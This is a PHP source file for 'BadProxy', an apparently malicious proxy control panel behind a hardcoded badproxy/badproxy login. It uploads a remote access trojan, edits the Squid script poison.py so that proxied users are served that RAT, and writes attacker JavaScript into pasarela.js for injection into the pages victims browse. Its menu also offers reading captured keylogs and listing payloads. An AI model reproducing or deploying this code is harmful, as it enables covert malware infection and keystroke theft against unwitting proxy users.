<?php
  const USER = 'badproxy';
  const PASS = 'badproxy';

  const RAT = 'RATTATA';
  const POISON = '/etc/squid/poison.py';
  const PASARELA = '/etc/squid/pasarela.js';
  const APACHE_CONF = '/etc/apache2/sites-available/000-default.conf';
  /*
  if(file_exists(APACHE_CONF)){
    $conf = trim(file_get_contents(APACHE_CONF));
    preg_match('/DocumentRoot (\/.+)/', $conf, $matches);
    $root = $matches[1];
    if(strrpos($root, '/', -1) !== (strlen($root)-1)){
      $root .= '/';
    }
  }
  */
  
  session_start();

  function toggle_rat($opt){
      $poison = trim(file_get_contents(POISON));
      if(!$opt){
        unlink(RAT);
        $poison = preg_replace("/#+(''')/", "$1", $poison);
      }
      else if(file_exists(RAT)){
        $poison = preg_replace("/(''')/", "#$1", $poison);
      }
      try{
        file_put_contents(POISON, $poison);
      }
      catch (Exception $e){
          print '<script>alert("Failed to update poison.py");location.assign("/proxyboard");</script>';
      }
      if(!$opt){
        print 'RAT Infection has been DISABLED';
      }
      else{
        print '<script>alert("poison.py updated to serve your RAT");location.assign("/proxyboard");</script>';
      }
      exit;
  }

  function update_pasarela($content, $mode){
    $fp = fopen(PASARELA, $mode);
    fwrite($fp, urldecode($content));
    fclose($fp);
    exit;
  }
  if(isset($_POST['txt']) && $_POST['txt'] !== ""){
      update_pasarela($_POST['txt'], $_POST['mode']);
  }

  if($_SERVER['REQUEST_METHOD'] === 'POST'){
    if(isset($_POST['uname']) && isset($_POST['passwd'])){
      $uname = $_POST['uname'];
      $passwd = $_POST['passwd'];

      if($uname === USER && $passwd === PASS){
        $_SESSION['login'] = true;
        //header('Location: index.php');
      }
      else{
        $msg = 'Invalid username/password';
      }
    }
    
    if(!empty($_FILES)) {
      $name = $_FILES["rat"]["name"];
      move_uploaded_file($_FILES["rat"]["tmp_name"], RAT);
      if($_FILES['rat']['error'] === UPLOAD_ERR_OK){
        toggle_rat(true);
      }
      else{
        ?>
        <script>alert('[~] Upload failed');</script>
        <?php
        exit;
      }
    }
  }
  else if(isset($_GET['logout'])){
      //log out
      $_SESSION = array();
      if(ini_get('session.use_cookies')){
        $params = session_get_cookie_params();
        setcookie(session_name(),'',time() - 42000, $params['path'], $params['domain'], $params['secure'], $params['httponly']);
      }
    session_destroy();
  }
  else if(isset($_GET['disable'])){
    toggle_rat(false);
  }
?>
<!DOCTYPE html>
<html>
  <head>
    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="css/style.css">
  </head>
  <body>
  <?php
    if(!isset($_SESSION['login'])){
  ?>

  <!--
  start
  -->
  <div class="modal-dialog">
      <div class="modal-content">
        <div class="modal-header" align="center">
          <img src="images/logo.png" align="center" />
          <button type="button" class="close" data-dismiss="modal" aria-label="Close">

          </button>
        </div>

                <!-- Begin # DIV Form -->
                <div id="div-forms">
                    <!-- Begin # Login Form -->
                    <form id="login-form" method="post">
                    <div class="modal-body">
                <div id="div-login-msg">
                                <div id="icon-login-msg" class="glyphicon glyphicon-chevron-right"></div>
                                <span id="text-login-msg">Type your username and password.</span>
                            </div>
                <input id="login_username" class="form-control" type="text" name="uname" placeholder="Username" required>
                <input id="login_password" class="form-control" name="passwd" type="password" placeholder="Password" required>
                  </div>
                <div class="modal-footer">
                            <div>
                                <button type="submit" value="login" class="btn btn-primary btn-lg btn-block">Login</button>
                            </div>
                  <div>
                                <?php
                                  if(isset($msg)){
                                    print("<p>$msg</p>");
                                  }
                                ?>
                            </div>
                </div>
                    </form>
                    <!-- End # Login Form -->

                </div>
                <?php
      exit;
    }
  ?>
  <!-- End # DIV Form -->
  <!-- end -->
  <style>
    a{
      color: rgb(0, 132, 255);
      text-decoration: none;
      font-weight: bold;
      cursor: pointer;
    }
    table tr td:first-child{
      text-align: right;
    }
    td{
      padding: 5px;
      margin: 5px;
    }
    button{
      float:right;
    }
    textarea{
      height: 450px;
      width: 100%;
    }
    div{
      text-align: justify;
    }
    ol li:hover{
      cursor: pointer;
      text-decoration: underline;
    }
  </style>

  <nav class="navbar navbar-default nav-check">
  <div class="container-fluid">
    <div class="navbar-header">
      <a class="navbar-brand" href="#">
        <h2>BadProxy</h2>
      </a>
    </div>
    <button class="btn btn-default navbar-right navbar-btn" onclick="location='?logout'">Log out</button>
  </div>
</nav>
  <div class="container-fluid">
      <div class="row">
      <div class="col-md-4 main-content">
        <ul class="nav nav-pills nav-stacked nav-control">
        <!--
            <li role="presentation" class="active-main"><a href='#' id='list-plugins' onclick='list_plugins()'>List installed plugins</a></li>
            <li role="presentation"><a href='#' id='detect-lastpass' onclick='detect_lastpass()'>Detect Lastpass</a></li>
            <li role="presentation"><a href='#' id='detect-flash' onclick='detect_flash()'>Detect Flash</a></li>
        -->
            <li role="presentation"><a onclick='update_pasarela("w")'>Update pasarela.js</a></li>
            <li role="presentation"><a onclick='read_keylogs()'>READ Keylogs</a></li>
            <li role="presentation"><a onclick='list_payloads()'>List PAYLOADS</a></li>
          </ul>
      </div>
      <div class="col-md-6 selector" style="padding:2%;">
      </div>
    </div>
  </div>
  <script src='scr/exploit.js'></script>
  </body>
</html>
